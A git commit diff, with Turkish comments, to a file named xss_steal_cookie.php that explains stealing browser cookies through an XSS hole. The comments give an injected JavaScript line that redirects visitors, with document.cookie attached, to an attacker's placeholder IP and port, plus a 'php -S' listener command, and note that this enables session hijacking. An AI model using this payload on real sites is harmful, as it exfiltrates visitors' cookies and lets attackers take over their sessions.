3d1d4938f41296e9a6442785296a00d9d0074489
Regaip KURT <regkrt@gmail.com>
2020-06-08 11:38:19 +0300

    XSS Açığı üzerinden PHP ile Cookie Çalma

--- xss_steal_cookie.php
+++ xss_steal_cookie.php
@@ -8,8 +8,8 @@
         xss açığı bulunan bir siteye aşağıdaki javascript kodunu yedirdiğimizi düşünelim
 	#document.location = "http://ip_adresi:port/php_dosya_adi.php?c="+document.cookie
 
-	# php -S ip_adresi:port
-	Böyle yapıldığından php ile kendi ipmizin belirttiğimiz port numarasından bir dinleme yapıyoruz.
+	# php -S ip_adresi:port #PHP SESSION AÇMA 
+	Böyle yapıldığında php ile kendi ipmizin belirttiğimiz port numarasından bir dinleme yapıyoruz.
 
         bu php dosyasına ilgili sitedeki açıktan faydalanarak kullanıcıyı yönlendirdiğimizde
         kullanıcının tarayıcısında o an sayfada kayıtlı olan cookileri almış oluruz!
@@ -19,6 +19,7 @@
         bu php dosyası da kendine gelen isteklerden get metodu ile c olarak ayarlanan kısmı alıyor.
         c kısmını ise xss açıklı sitedeki document.cookie ile alıyoruz.
         dolayısıyla o sayfaya kim girmiş ise onun cookileri bize yönlendiriliyor.
+	Böylelikle oturum çalma işlemi vs. gibi işlemler gerçekleştirebiliyoruz.
         */
 ?>
 
